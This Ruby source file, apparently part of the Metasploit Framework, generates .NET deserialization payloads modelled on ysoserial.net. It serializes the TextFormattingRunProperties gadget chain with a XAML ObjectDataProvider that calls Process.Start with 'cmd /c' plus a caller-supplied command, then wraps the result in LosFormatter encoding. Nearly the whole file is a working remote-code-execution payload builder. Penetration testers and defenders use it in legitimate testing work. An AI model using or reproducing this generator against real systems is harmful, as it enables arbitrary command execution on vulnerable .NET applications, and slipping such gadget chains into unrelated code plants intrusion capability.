module Msf
module Util

require 'bindata'

#
# Much of this code is based on the YSoSerial.Net project
# see: https://github.com/pwntester/ysoserial.net
#
class DotNetDeserialization
  DEFAULT_FORMATTER = :LosFormatter
  DEFAULT_GADGET_CHAIN = :TextFormattingRunProperties

  def self.encode_7bit_int(int)
    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/mscorlib/system/io/binaryreader.cs#L582
    encoded_int = []
    while int > 0
      value = int & 0x7f
      int >>= 7
      value |= 0x80 if int > 0
      encoded_int << value
    end
    return encoded_int.pack('C*')
  end

  #
  # .NET Serialization Enumerations
  #
  BinaryTypeEnum = {
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/054e5c58-be21-4c86-b1c3-f6d3ce17ec72
    :Primitive => 0,
    :String => 1,
    :Object => 2,
    :SystemClass => 3,
    :Class => 4,
    :ObjectArray => 5,
    :StringArray => 6,
    :PrimitiveArray => 7
  }

  RecordTypeEnum = {
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/954a0657-b901-4813-9398-4ec732fe8b32
    :SerializedStreamHeader => 0,
    :ClassWithId => 1,
    :SystemClassWithMembers => 2,
    :ClassWithMembers => 3,
    :SystemClassWithMembersAndTypes => 4,
    :ClassWithMembersAndTypes => 5,
    :BinaryObjectString => 6,
    :BinaryArray => 7,
    :MemberPrimitiveTyped => 8,
    :MemberReference => 9,
    :ObjectNull => 10,
    :MessageEnd => 11,
    :BinaryLibrary => 12,
    :ObjectNullMultiple256 => 13,
    :ObjectNullMultiple => 14,
    :ArraySinglePrimitive => 15,
    :ArraySingleObject => 16,
    :ArraySingleString => 17,
    :MethodCall => 21,
    :MethodReturn => 22
  }

  #
  # .NET Serialization Types
  #
  class LengthPrefixedString < BinData::BasePrimitive
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/10b218f5-9b2b-4947-b4b7-07725a2c8127
    def assign(val)
      super(binary_string(val))
    end

    private

    def value_to_binary_string(string)
      return DotNetDeserialization.encode_7bit_int(string.length) + string
    end

    def read_and_return_value(io)
      # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/mscorlib/system/io/binaryreader.cs#L582
      count = 0
      shift = 0
      # todo: finish this implementation
      loop do |i|
        if shift == 5 * 7
          raise Msf::Exception('The value exceeds the 5 byte limit for 7-bit encoded integers')
        end
        ch = io.readbytes(1).unpack('C')[0]
        count |= (ch & 0x7f) << shift
        shift += 7
        break if (ch & 0x80) == 0
      end

      io.readbytes(count)
    end

    def sensible_default
      ""
    end
  end

  class BinaryLibrary < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/7fcf30e1-4ad4-4410-8f1a-901a4a1ea832
    endian                 :little
    hide                   :record_type
    uint8                  :record_type, :asserted_value => RecordTypeEnum[:BinaryLibrary]
    int32                  :library_id
    length_prefixed_string :library_name
  end

  class BinaryObjectString < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/eb503ca5-e1f6-4271-a7ee-c4ca38d07996
    endian                 :little
    hide                   :record_type
    uint8                  :record_type, :asserted_value => RecordTypeEnum[:BinaryObjectString]
    int32                  :obj_id
    length_prefixed_string :string
  end

  class ClassInfo < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/0a192be0-58a1-41d0-8a54-9c91db0ab7bf
    endian                 :little
    int32                  :obj_id
    length_prefixed_string :name
    int32                  :member_count, :value => lambda { member_names.length }
    array                  :member_names, :type => :length_prefixed_string, :read_until => lambda { index == member_count - 1 }
  end

  class MemberTypeInfo < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/aa509b5a-620a-4592-a5d8-7e9613e0a03e
    endian                 :little
    array                  :binary_type_enums, :type => :uint8
    #??? : member_type_info # this field is not supported, it's only used if binary_type_enums contains
    # Primitive, SystemClass, Class, or PrimitiveArray
    virtual                :valid, :assert => lambda {
      (!binary_type_enums.include? BinaryTypeEnum[:Primitive]) \
        && (!binary_type_enums.include? BinaryTypeEnum[:SystemClass]) \
        && (!binary_type_enums.include? BinaryTypeEnum[:Class]) \
        && (!binary_type_enums.include? BinaryTypeEnum[:PrimitiveArray])
    }
    virtual :assert => lambda { valid.assert! }
  end

  class MessageEnd < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/de6a574b-c596-4d83-9df7-63c0077acd32
    endian                 :little
    hide                   :record_type
    uint8                  :record_type, :asserted_value => RecordTypeEnum[:MessageEnd]
  end

  class ClassWithMembersAndTypes < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/847b0b6a-86af-4203-8ed0-f84345f845b9
    endian                 :little
    hide                   :record_type
    uint8                  :record_type, :asserted_value => RecordTypeEnum[:ClassWithMembersAndTypes]
    class_info             :class_info
    member_type_info       :member_type_info
    int32                  :library_id
    virtual                :valid, :assert => lambda {
      member_type_info.valid.assert!
    }
    virtual :assert => lambda { valid.assert! }
  end

  class SerializationHeaderRecord < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/a7e578d3-400a-4249-9424-7529d10d1b3c
    endian                 :little
    default_parameter      major_version: 1
    default_parameter      minor_version: 0
    hide                   :record_type
    uint8                  :record_type, :asserted_value => RecordTypeEnum[:SerializedStreamHeader]
    int32                  :root_id
    int32                  :header_id
    int32                  :major_version, :initial_value => :major_version
    int32                  :minor_version, :initial_value => :minor_version
  end

  class ObjectStateFormatter < BinData::Record
    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System.Web/UI/ObjectStateFormatter.cs
    endian                 :little
    default_parameter      marker_format: 0xff
    default_parameter      marker_version: 1
    hide                   :marker_format,  :marker_version
    uint8                  :marker_format,  :initial_value => :marker_format
    uint8                  :marker_version, :initial_value => :marker_version
    uint8                  :token
  end

  #
  # Generation Methods
  #

  # Generates a .NET deserialization payload for the specified OS command using
  # a selected gadget-chain and formatter combination.
  #
  # @param cmd [String] The OS command to execute.
  # @param gadget_chain [Symbol] The gadget chain to use for execution. This
  #   will be application specific.
  # @param formatter [Symbol] An optional formatter to use to encapsulate the
  #   gadget chain.
  # @return [String]
  def self.generate(cmd, gadget_chain: DEFAULT_GADGET_CHAIN, formatter: DEFAULT_FORMATTER)
    serialized = self.generate_gadget_chain(cmd, gadget_chain: gadget_chain)
    serialized = self.generate_formatted(serialized, formatter: formatter) unless formatter.nil?
    serialized
  end

  # Take the specified serialized blob and encapsulate it with the specified
  # formatter.
  #
  # @param formatter [Symbol] The formatter to use to encapsulate the serialized
  #   data blob.
  # @return [String]
  def self.generate_formatted(serialized, formatter: DEFAULT_FORMATTER)
    case formatter
    when :LosFormatter
      # token: Token_BinarySerialized
      formatted  = ObjectStateFormatter.new(token: 50).to_binary_s
      formatted << encode_7bit_int(serialized.length)
      formatted << serialized
    else
      raise NotImplementedError, 'The specified formatter is not implemented'
    end

    formatted
  end

  # Generate a serialized data blob using the specified gadget chain to execute
  # the OS command. The chosen gadget chain must be compatible with the target
  # application.
  #
  # @param gadget_chain [Symbol] The gadget chain to use for execution.
  # @return [String]
  def self.generate_gadget_chain(cmd, gadget_chain: DEFAULT_GADGET_CHAIN)
    case gadget_chain
    when :TextFormattingRunProperties
      # see: https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TextFormattingRunPropertiesGenerator.cs
      resource_dictionary = Nokogiri::XML(<<-EOS, nil, nil, options=Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
        <ResourceDictionary
          xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
          xmlns:X="http://schemas.microsoft.com/winfx/2006/xaml"
          xmlns:S="clr-namespace:System;assembly=mscorlib"
          xmlns:D="clr-namespace:System.Diagnostics;assembly=system"
        >
          <ObjectDataProvider X:Key="" ObjectType="{X:Type D:Process}" MethodName="Start">
            <ObjectDataProvider.MethodParameters>
              <S:String>cmd</S:String>
              <S:String>/c #{cmd.encode(:xml => :text)}</S:String>
            </ObjectDataProvider.MethodParameters>
          </ObjectDataProvider>
        </ResourceDictionary>
      EOS
      resource_dictionary = resource_dictionary

      library = BinaryLibrary.new(
        library_id: 2,
        library_name: "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
      )

      serialized  = SerializationHeaderRecord.new(root_id: 1, header_id: -1).to_binary_s
      serialized << library.to_binary_s
      serialized << ClassWithMembersAndTypes.new(
        class_info: ClassInfo.new(
          obj_id: 1,
          name: 'Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties',
          member_names: ['ForegroundBrush']
        ),
        member_type_info: MemberTypeInfo.new(
          binary_type_enums: [BinaryTypeEnum[:String]]
        ),
        library_id: library.library_id
      ).to_binary_s
      serialized << BinaryObjectString.new(
        obj_id: 3,
        string: resource_dictionary
      ).to_binary_s
      serialized << MessageEnd.new.to_binary_s
    else
      raise NotImplementedError, 'The specified gadget chain is not implemented'
    end

    serialized
  end
end
end
end
